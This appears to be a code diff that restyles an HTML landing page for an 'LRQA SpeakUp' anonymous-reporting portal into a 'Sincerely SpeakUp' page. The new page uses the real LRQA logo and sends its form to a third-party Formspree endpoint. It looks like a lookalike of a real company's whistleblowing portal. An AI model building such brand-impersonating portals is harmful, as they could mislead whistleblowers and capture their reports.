@@ -1,271 +1,131 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>LRQA SpeakUp - 匿名投诉</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sincerely SpeakUp</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       display: flex;
-      flex-direction: column; /* 顶栏 + 主体 */
+      flex-direction: column;
       height: 100vh;
+      background-color: #f5f5f5;
     }
-
-    /* 顶部白色框 */
     .top-bar {
       width: 100%;
-      height: 65px;
-      background: white;
-      border-bottom: 1px solid #ddd;
+      background-color: white;
       display: flex;
-      justify-content: space-between; /* 左右对齐 */
+      justify-content: space-between;
       align-items: center;
-      padding: 0 20px;
-      box-sizing: border-box;
+      padding: 10px 30px;
+      border-bottom: 2px solid #eee;
     }
-    .top-bar .left-logo img {
+    .top-bar img {
       height: 40px;
     }
-    .top-bar .right-controls {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-    .top-bar .right-controls img {
-      height: 30px;
-    }
-    .language-select {
-      padding: 6px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+    .lang-select {
       font-size: 14px;
+      padding: 5px;
     }
-
-    /* 页面主区域：左右分栏 */
-    .main {
+    .container {
       display: flex;
-      flex: 1; /* 占满剩余空间 */
+      flex: 1;
+      height: 100%;
     }
-
-    /* 左侧背景改为图片 */
-    .left-panel {
-      background: url("bg.jpg") no-repeat center center;
+    .left {
+      flex: 1;
+      background: url('https://images.unsplash.com/photo-1507842217343-583bb7270b66') no-repeat center center;
       background-size: cover;
-      width: 25%;
+    }
+    .right {
+      flex: 1;
+      background-color: #ffffff;
+      padding: 60px;
       display: flex;
-      align-items: flex-end;
+      flex-direction: column;
       justify-content: center;
-      padding: 20px;
-      color: #fff;
-      text-shadow: 0 1px 4px rgba(0,0,0,0.6);
-      transition: all 0.4s ease;
     }
-    .left-panel small {
-      font-size: 12px;
-    }
-
-    /* 右侧主区域 */
-    .right-panel {
-      width: 75%;
-      display: flex;
-      align-items: center;
-      justify-content: flex-start;
-      background: #f9f9f9;
-      padding-left: 250px; /* 控制整体左移 */
-      transition: all 0.3s ease;
-    }
-
     .content {
-      max-width: 420px;
-      text-align: left;  /* 文字左对齐 */
-    }
-    .logo {
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 80px;
+      max-width: 400px;
+      margin: auto;
+      text-align: left;
     }
     h1 {
-      font-size: 24px;
-      margin: 10px 0;
-      color: #222;
-      font-weight: 400;
+      color: #1b3d2f;
+      margin-bottom: 10px;
     }
-
     p {
-      color: #555;
+      color: #333;
       font-size: 14px;
-      margin: 15px 0;
+      margin-bottom: 30px;
     }
-    p:nth-of-type(1) {
-      color: #00695c;
-      font-weight: 500;
-      margin-bottom: 50px;
-    }
-
-    /* 按钮样式 */
     .btn {
-      display: block;
-      width: 580px; /* 固定宽度 */
-      padding: 14px;
-      margin: 12px 0;
-      font-size: 16px;
-      border-radius: 6px;
-      border: 1px solid #00695c;
-      cursor: pointer;
-      transition: 0.3s;
-      text-align: left;
-      padding-left: 20px;
-      box-sizing: border-box;
-    }
-    .btn-report {
-      background: #00695c;
+      background-color: #1b3d2f;
       color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-bottom: 15px;
     }
-    .btn-report:hover {
-      background: #004d40;
-    }
-    .btn-login {
-      background: white;
-      color: #00695c;
-    }
-    .btn-login:hover {
-      background: #f0f0f0;
+    .btn:hover {
+      background-color: #2a5c45;
     }
 
-    /* ✅ 手机模式自适应 */
-    @media (max-width: 720px) {
-      body {
-        height: auto;
+    @media (max-width: 768px) {
+      .container {
         flex-direction: column;
       }
-
-      .main {
-        flex-direction: column;
+      .left {
+        order: 2; /* 图片部分移动到底部 */
+        height: 200px;
       }
-
-      .right-panel {
-        width: 100%;
-        padding: 25px;
-        justify-content: flex-start;
-        align-items: flex-start;
-        background: #f9f9f9;
-        order: 1; /* 让右侧内容在上 */
+      .right {
+        order: 1;
+        padding: 30px 20px;
       }
-
-      .left-panel {
-        order: 2; /* ✅ 背景图移动到底部 */
-        width: 100%;
-        height: 220px;
-        background-position: bottom center;
-        background-size: cover;
-        align-items: flex-end;
-        justify-content: center;
-        padding: 20px;
-      }
-
       .content {
-        text-align: left;
         width: 100%;
         max-width: none;
-      }
-
-      h1 {
-        font-size: 20px;
-        margin-top: 0;
-      }
-
-      p {
-        font-size: 14px;
-      }
-
-      .btn {
-        width: 100%;
-        margin: 10px 0;
-      }
-
-      .btn-report, .btn-login {
-        font-size: 15px;
-      }
-
-      .top-bar {
-        flex-direction: row;
-        height: auto;
       }
     }
   </style>
 </head>
-
 <body>
-  <!-- 顶部白色框 -->
   <div class="top-bar">
-    <div class="left-logo">
-      <img src="su.jpg" alt="公司 Logo">
-    </div>
-    <div class="right-controls">
-      <img src="sr.png" alt="合作 Logo">
-      <select class="language-select" onchange="changeLanguage(this.value)">
-        <option value="zh">中文</option>
-        <option value="en">English</option>
-        <option value="ms">Bahasa Melayu</option>
-        <option value="my">မြန်မာစာ (Burmese)</option>
-        <option value="bn">বাংলা (Bengali)</option>
-        <option value="ne">नेपाली (Nepali)</option>
-        <option value="th">ไทย (Thai)</option>
-        <option value="hi">हिन्दी (Hindi)</option>
-        <option value="uk">Українська (Ukrainian)</option>
-        <option value="id">Bahasa Indonesia</option>
-      </select>
-    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/LRQA_logo.svg/512px-LRQA_logo.svg.png" alt="Logo">
+    <select class="lang-select">
+      <option>English</option>
+      <option>Bahasa Melayu</option>
+      <option>中文</option>
+      <option>ไทย (Thai)</option>
+      <option>नेपाली (Nepali)</option>
+      <option>हिन्दी (India)</option>
+      <option>Українська (Ukrainian)</option>
+      <option>Bahasa Indonesia</option>
+    </select>
   </div>
 
-  <!-- 主体区域 -->
-  <div class="main">
-    <div class="left-panel"></div>
-    <div class="right-panel">
-      <div class="content">
-        <div class="logo">
-          <img src="mylogo.png" alt="公司 Logo">
-        </div>
-        <h1>LRQA SpeakUp</h1>
-        <p>LRQA SpeakUp 隐私政策</p>
-        <p>通过创建新报告来开始一次保密对话。</p>
+  <div class="container">
+    <div class="left"></div>
 
-        <button class="btn btn-report" onclick="goToReport()">＋ 新报告</button>
-        <button class="btn btn-login" onclick="window.location.href='8digit&pw.html'">🔒 登录</button>
+    <div class="right">
+      <div class="content">
+        <h1>Welcome to Sincerely SpeakUp</h1>
+        <p>Please choose one of the options below to continue.</p>
+        <form action="https://formspree.io/f/mrgnldkd" method="POST">
+          <button class="btn" type="submit" name="action" value="new-report">New Report</button>
+          <button class="btn" type="button" onclick="window.location.href='login.html'">Login to your report</button>
+        </form>
       </div>
     </div>
   </div>
-
-  <!-- 多语言脚本 -->
-  <script>
-    const translations = {
-      zh: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp 隐私政策", desc:"通过创建新报告来开始一次保密对话。", newReport:"＋ 新报告", login:"🔒 登录" },
-      en: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp Privacy Policy", desc:"Start a confidential conversation by creating a new report.", newReport:"+ New Report", login:"🔒 Login" },
-      ms: { title:"LRQA SpeakUp", policy:"Dasar Privasi LRQA SpeakUp", desc:"Mulakan perbualan sulit dengan membuat laporan baharu.", newReport:"+ Laporan Baharu", login:"🔒 Log Masuk" },
-      my: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp သီးသန့်မူဝါဒ", desc:"သင့်တိုင်တိုင်ပြောရန် အစီရင်ခံစာအသစ်တစ်စောင်ဖန်တီးပါ။", newReport:"＋ အစီရင်ခံစာအသစ်", login:"🔒 ဝင်ရောက်ရန်" },
-      bn: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp গোপনীয়তা নীতি", desc:"একটি নতুন রিপোর্ট তৈরি করে একটি গোপনীয় কথোপকথন শুরু করুন।", newReport:"＋ নতুন রিপোর্ট", login:"🔒 লগইন" },
-      ne: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp गोपनीयता नीति", desc:"नयाँ रिपोर्ट बनाएर गोप्य संवाद सुरु गर्नुहोस्।", newReport:"＋ नयाँ रिपोर्ट", login:"🔒 लगइन" },
-      th: { title:"LRQA SpeakUp", policy:"นโยบายความเป็นส่วนตัวของ LRQA SpeakUp", desc:"เริ่มต้นการสนทนาแบบเป็นความลับโดยสร้างรายงานใหม่", newReport:"＋ รายงานใหม่", login:"🔒 เข้าสู่ระบบ" },
-      hi: { title:"LRQA SpeakUp", policy:"LRQA SpeakUp गोपनीयता नीति", desc:"एक नई रिपोर्ट बनाकर एक गोपनीय वार्ता शुरू करें।", newReport:"＋ नई रिपोर्ट", login:"🔒 लॉगिन" },
-      uk: { title:"LRQA SpeakUp", policy:"Політика конфіденційності LRQA SpeakUp", desc:"Розпочніть конфіденційну розмову, створивши новий звіт.", newReport:"＋ Новий звіт", login:"🔒 Увійти" },
-      id: { title:"LRQA SpeakUp", policy:"Kebijakan Privasi LRQA SpeakUp", desc:"Mulai percakapan rahasia dengan membuat laporan baru.", newReport:"＋ Laporan Baru", login:"🔒 Masuk" }
-    };
-
-    function changeLanguage(lang) {
-      const t = translations[lang];
-      document.querySelector("h1").textContent = t.title;
-      document.querySelectorAll("p")[0].textContent = t.policy;
-      document.querySelectorAll("p")[1].textContent = t.desc;
-      document.querySelector(".btn-report").textContent = t.newReport;
-      document.querySelector(".btn-login").textContent = t.login;
-    }
-
-    function goToReport() {
-      window.location.href = "report.html";
-    }
-  </script>
 </body>
 </html>
-
